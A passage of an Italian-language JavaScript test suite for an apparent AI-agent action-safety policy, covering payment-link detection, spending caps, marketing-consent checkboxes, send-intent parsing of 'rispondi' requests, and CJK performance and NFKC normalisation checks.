  const rapporto = mediana(rapporti);
  console.log(`# PROT-11-RAPPORTO 500/50 elementi ${rapporto.toFixed(1)} (giri ${rapporti.map((r) => r.toFixed(1)).join(' ')})`);
  assert.ok(rapporto < 15, `rapporto ${rapporto.toFixed(1)}: il costo cresce più che linearmente col numero di elementi`);
});

// ---------- tagli del censimento delle interruzioni (regola 17 dell'owner, 02/11) ----------
test('PROT-33: «F24», «bollettino», «pagoPA» pagano da soli ma non quando si scarica o si guarda il documento (T3), e al contrario', () => {
  const sul = (nome, politica = PIENO) => valutaAzione({ azione: { tipo: 'premi' }, bersaglio: { ruolo: 'collegamento', nome }, schermata: vuota, politica, contesto: ctx() });
  for (const nome of ['Modello F24 (PDF)', 'Scarica il modello F24', 'F24 semplificato - istruzioni', 'Scarica il bollettino', 'Stampa il bollettino PagoPA', 'Anteprima F24']) {
    assert.equal(sul(nome).decisione, 'procedi', nome);
  }
  // la prova al contrario (condizione del Desktop): un pagamento vero con «F24» resta un pagamento
  for (const nome of ['F24', 'Paga l\'F24', 'Paga con F24', 'Bollettino PagoPA', 'Paga il bollettino', 'Scarica e paga l\'F24', 'Invia F24']) {
    const r = sul(nome);
    assert.deepEqual([r.decisione, r.protezione], ['ferma', 'pagamento'], nome);
  }
});

test('PROT-35: importi con valuta (separatori italiani e inglesi) e tetto di spesa SOLO con un segnale e una valuta', () => {
  const casi = [['Totale 54,00 €', [[54, 'EUR']]], ['Totale: € 1.234,56', [[1234.56, 'EUR']]], ['$1,299.99', [[1299.99, 'USD']]], ['1.000 €', [[1000, 'EUR']]],
    ['CHF 12.50', [[12.5, 'CHF']]], ['50 euro', [[50, 'EUR']]], ['£ 9', [[9, 'GBP']]], ['Prezzo 45 € + spedizione 9 €', [[45, 'EUR'], [9, 'EUR']]],
    ['ordine 12345', []], ['codice 4111 1111', []], ['1 250,00 €', [[1250, 'EUR']]]];
  for (const [testo, atteso] of casi) assert.deepEqual(importiNelTesto(testo).map((x) => [x.importo, x.valuta]), atteso, testo);
  for (const [frase, atteso] of [['compra le cuffie, fino a 50 €', [50, 'EUR']], ['spendendo al massimo 80 euro', [80, 'EUR']], ['non spendere più di 30 €', [30, 'EUR']],
    ['buy headphones up to $60', [60, 'USD']], ['max 25 €', [25, 'EUR']], ['entro 40 €', [40, 'EUR']]]) {
    const t = tettoDallaFrase(frase);
    assert.deepEqual([t?.importo, t?.valuta], atteso, frase);
  }
  // al contrario: un prezzo non è un tetto, un tetto senza valuta non vale, nessun numero nessun tetto
  for (const frase of ['compra le cuffie da 50 €', 'compra fino a 50', 'compra il biglietto', 'il totale è 50 €', '']) assert.equal(tettoDallaFrase(frase), null, frase);
});

test('PROT-36: caselle di marketing, newsletter, terzi, profilazione: «scelta riservata» in ogni permesso; informativa e termini restano «termini»', () => {
  const sul = (nome, politica) => valutaAzione({ azione: { tipo: 'premi' }, bersaglio: casella(nome), schermata: vuota, politica, contesto: ctx({ piano: { domini: ['biglietti.example'] } }) });
  for (const nome of ['Voglio ricevere la newsletter', 'Acconsento al trattamento per finalità di marketing', 'Condividi i miei dati con partner e terze parti',
    'Acconsento alla profilazione', 'Send me promotional emails', 'Ricevi offerte speciali']) {
    for (const politica of [PIENO, SEMPRE, NORMALE, TELEFONO]) {
      const r = sul(nome, politica);
      assert.deepEqual([r.protezione, r.motivo, r.decisione], ['consenso', 'marketing', 'scegli-riservato'], `${nome} / ${politica.nome}`);
    }
  }
  for (const nome of ['Ho letto l\'informativa privacy', 'Accetto termini e condizioni']) assert.equal(sul(nome, NORMALE).motivo, 'termini', nome);
});

test('PROT-34: «Consenti sempre» non segna più in silenzio la casella di consenso (decisione 239): chiede nel piano, fuori, col sospetto; i cookie restano riservati', () => {
  const casellaPrivacy = { azione: { tipo: 'premi' }, bersaglio: casella('Ho letto e accetto l\'informativa privacy'), schermata: { elementi: [], dominio: 'otticarossi.example' }, politica: SEMPRE };
  const nelPiano = ctx({ piano: { domini: ['otticarossi.example'], app: [] } });
  const r = valutaAzione({ ...casellaPrivacy, contesto: nelPiano });
  // decisione 239 (owner 05/11, R1): il consenso sul dominio del piano non si segna più in silenzio, chiede
  assert.deepEqual([r.protezione, r.decisione], ['consenso', 'chiedi']);
  assert.equal(valutaAzione({ ...casellaPrivacy, contesto: ctx() }).decisione, 'chiedi', 'fuori dal piano');
  assert.equal(valutaAzione({ ...casellaPrivacy, contesto: { ...nelPiano, sospetto: true } }).decisione, 'chiedi', 'col sospetto');
  const banner = { elementi: [{ ruolo: 'testo', nome: 'Usiamo i cookie per migliorare la tua esperienza' }], dominio: 'otticarossi.example' };
  assert.equal(valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Accetta tutti i cookie'), schermata: banner, politica: SEMPRE, contesto: nelPiano }).decisione, 'scegli-riservato', 'i cookie restano riservati');
  assert.equal(valutaAzione({ ...casellaPrivacy, politica: NORMALE, contesto: nelPiano }).decisione, 'chiedi', 'il permesso normale chiede ancora');
});

test('PROT-11-CJK (S-8, Performance 04/11): una pagina giapponese di 500 campi latino+CJK costa al più 1,5 volte una latina, più 0,2 ms', () => {
  // Il tetto in millisecondi dipende dal carico; il confronto no: le due pagine si misurano alternate nello stesso processo.
  // Regola di Performance: p95 giapponese ≤ p95 latina × 1,5 + 0,2 ms. La promessa «sotto 1 ms» la verifica Performance a macchina libera.
  const pagina = (nome) => ({ elementi: [...Array.from({ length: 500 }, (_, i) => ({ ref: `f${i}`, ruolo: 'campo', nome: nome(i), visibile: true })), { ref: 'c', ruolo: 'pulsante', nome: 'Continua', visibile: true }] });
  // pagine NUOVE a ogni giro: una pagina ripetuta la servirebbe la memoria di norma, e la prova misurerebbe la memoria
  const G = Array.from({ length: 240 }, (_, k) => pagina((i) => `iPhone用ケース番号${i}-${k} とiPad`));
  const L = Array.from({ length: 240 }, (_, k) => pagina((i) => `Phone case number ${i}-${k} and iPad`));
  const chiama = (s) => valutaAzione({ azione: { tipo: 'premi' }, bersaglio: s.elementi[500], schermata: s, politica: PIENO, contesto: ctx() });
  const p95 = (v) => [...v].sort((a, b) => a - b)[Math.floor(v.length * 0.95)];
  const tG = [];
  const tL = [];
  for (let i = 0; i < 240; i += 1) {
    let t0 = process.hrtime.bigint();
    chiama(G[i]);
    const dG = Number(process.hrtime.bigint() - t0) / 1e6;
    t0 = process.hrtime.bigint();
    chiama(L[i]);
    const dL = Number(process.hrtime.bigint() - t0) / 1e6;
    if (i >= 40) { tG.push(dG); tL.push(dL); } // le prime quaranta sono riscaldamento
  }
  const g = p95(tG);
  const l = p95(tL);
  console.log(`# PROT-11-CJK p95 giapponese ${g.toFixed(3)} ms, latina ${l.toFixed(3)} ms, tetto ${(l * 1.5 + 0.2).toFixed(3)} ms`);
  assert.ok(g <= l * 1.5 + 0.2, `giapponese ${g.toFixed(3)} ms contro latina ${l.toFixed(3)} ms`);
});

test('PROT-11-NFKC (S-8): il filtro veloce dà sempre lo stesso testo di normalize(NFKC), carattere per carattere e in coppia', () => {
  const { nfkc } = PROVE_INTERNE;
  // UAX #15 §9: un blocco entra nel filtro solo se OGNI suo carattere è già NFKC e non si ricompone col vicino
  for (let cp = 0; cp <= 0xFFFF; cp += 1) {
    if (cp >= 0xD800 && cp <= 0xDFFF) continue;
    const c = String.fromCharCode(cp);
    assert.equal(nfkc(c), c.normalize('NFKC'), `U+${cp.toString(16).toUpperCase()}`);
  }
  // le coppie dove la ricomposizione morde: hiragana/katakana coi segni sonori, hangul jamo, latino coi combinanti
  const bordi = ['か', 'ハ', 'ウ', 'ゝ', 'ヽ', 'ワ', 'ヿ', 'ー', '゙', '゚', '゛', '゜', 'ﾞ', 'ｶ', '가', 'ᄀ', 'ᅡ', 'ᆨ', 'e', '́', 'A', '̊', '一', '﨑', '㋐', 'ｱ', '１', 'Ⅳ', ' ', '　'];
  for (const a of bordi) for (const b of bordi) for (const c of ['', 'x', '゙']) {
    const t = a + b + c;
    assert.equal(nfkc(t), t.normalize('NFKC'), JSON.stringify(t));
  }
});

test('PROT-11-TABELLA (S-8): la tabella delle classi dà lo stesso confine e lo stesso panino delle regex, su testi misti a caso', () => {
  const { basePiana, confine, paninoLargo, mappaNonCjk, CONFINE_LATINO_CJK, PANINO_LARGO } = PROVE_INTERNE;
  const alfa = ['a', 'P', 'g', 'é', 'ı', 'ɡ', 'а', 'о', 'α', 'ꓐ', 'ո', '李', '用', 'ケ', 'ー', 'と', 'ㄚ', 'ㅣ', '丨', 'ᄋ', '가', '〇', '㊀',
    '1', '２', '-', '.', "'", '’', '$', '€', ' ', '　', '​', '\u{E0041}', '́', '゙', '𠀀', '𝐀', '😀', '\uD800', '\uDC00',
    'Ⅳ', 'ⅰ', 'Ｐ', 'ｶ', '­', 'Ω', 'Я', 'ß', 'İ'];
  let seme = 20261104; // generatore fisso: un rosso si ripete uguale
  const caso = () => { seme = (seme * 1103515245 + 12345) % 2147483648; return seme / 2147483648; };
  for (let i = 0; i < 40000; i += 1) {
    let s = '';
    for (let j = 0; j <= i % 14; j += 1) s += alfa[Math.floor(caso() * alfa.length)];
    assert.equal(confine(s), s.replace(CONFINE_LATINO_CJK, ' '), `confine ${JSON.stringify(s)}`);
    const b = s.normalize('NFKC').toLowerCase().replace(/[\p{Default_Ignorable_Code_Point}\p{Cf}]/gu, '').replace(/\p{M}/gu, '');
    assert.equal(paninoLargo(basePiana(s)), PANINO_LARGO.test(mappaNonCjk(basePiana(s))), `panino ${JSON.stringify(s)}`);
    assert.equal(paninoLargo(b), PANINO_LARGO.test(mappaNonCjk(b)), `panino sulla base ${JSON.stringify(b)}`);
  }
});

test('PROT-37 (Mobile 04/11, conto delle carte; era PROT-35, nome già preso dagli importi): «rispondi» con la preposizione articolata chiede di inviare', () => {
  for (const f of ['Rispondi alla mail di Marco su Gmail che va bene giovedì', 'rispondi al messaggio di Luca', "rispondi all'email del capo",
    'Rispondi all’email del capo', 'RISPONDI ALLA MAIL DI MARCO', 'rispondi ai commenti sotto il post', 'rispondi agli auguri di Anna',
    'rispondi alle mail di ieri', 'rispondi allo studio dentistico che confermo', 'rispondi ad Anna che arrivo']) {
    assert.equal(intenzioniDallaFrase(f).inviare, true, f);
  }
  // le domande rivolte all'assistente e i propri messaggi restano fuori, come «rispondi a me»
  for (const f of ['rispondi alla mia domanda: quanto costa?', 'rispondi alle mie domande', 'rispondi al mio messaggio', 'rispondi alla mia mail',
    'Rispondi a questa domanda: quanto costa?', 'rispondi a me', 'rispondi alle domande del questionario', 'rispondi a tutte le domande',
    'rispondi a quella domanda di prima', "rispondi a quest'ultima domanda", 'rispondi a questa domanda del modulo']) {
    assert.equal(intenzioniDallaFrase(f).inviare, false, f);
  }
  // sul telefono il pulsante «Invia» di Gmail parte: la persona l'ha chiesto
  // (come fa il ciclo: la richiesta si calcola dalla frase della persona, ciclo.mjs:264)
  const invia = (frase) => valutaAzione({ azione: { tipo: 'premi' }, bersaglio: pulsante('Invia'), schermata: vuota, politica: POLITICHE.telefono,
    contesto: ctx({ richiesta: intenzioniDallaFrase(frase), testoDellaPersona: frase }) });
  const r = invia('Rispondi alla mail di Marco su Gmail che va bene giovedì');
  assert.notEqual(r.decisione, 'ferma', JSON.stringify(r));
  // e con una frase che non chiede di inviare il pulsante resta fermo
  assert.equal(invia('rispondi alla mia mail').decisione, 'ferma');
});

test("PROT-37-NEGA (V2-R1, revisione del Desktop 04/11): «… ma non inviarla» spegne l'invio anche se un'altra proposizione dice «rispondi alla …»", () => {
  for (const f of ['prepara una bozza e rispondi alla mail di Mario ma non inviarla', 'apri la mail di Mario, rispondi alla sua domanda nella bozza ma non inviare',
    'rispondi al questionario ma non inviarlo', 'rispondi al sondaggio senza inviarlo', 'compila il modulo e rispondi al questionario, non inviare', 'rispondi alla mail di Mario ma non la devi inviare', 'rispondi alla mail di Mario senza inviarla', 'rispondi alla mail di Luca ma non mandarla']) {
    assert.equal(intenzioniDallaFrase(f).inviare, false, f);
  }
});

test("PROT-37-ASSISTENTE (V2-R2): le domande all'assistente e le cose che non sono messaggi non chiedono di inviare", () => {
  for (const f of ['rispondi alla seguente domanda: quanto fa 2+2', 'rispondi alle seguenti domande', 'rispondi alla prossima domanda', 'rispondi alla tua domanda',
    'rispondi al quiz', 'rispondi al test', 'leggi e rispondi al quesito', 'rispondi al telefono', 'rispondi alla chiamata', 'rispondi al citofono', 'rispondi ad alta voce']) {
    assert.equal(intenzioniDallaFrase(f).inviare, false, f);
  }
});

test('PROT-37-QUESTO (V2-R3, testimone del mutante vivo V-R10): «rispondi a questo messaggio» resta fuori come «questa»', () => {
  assert.equal(intenzioniDallaFrase('rispondi a questo messaggio').inviare, false);
});
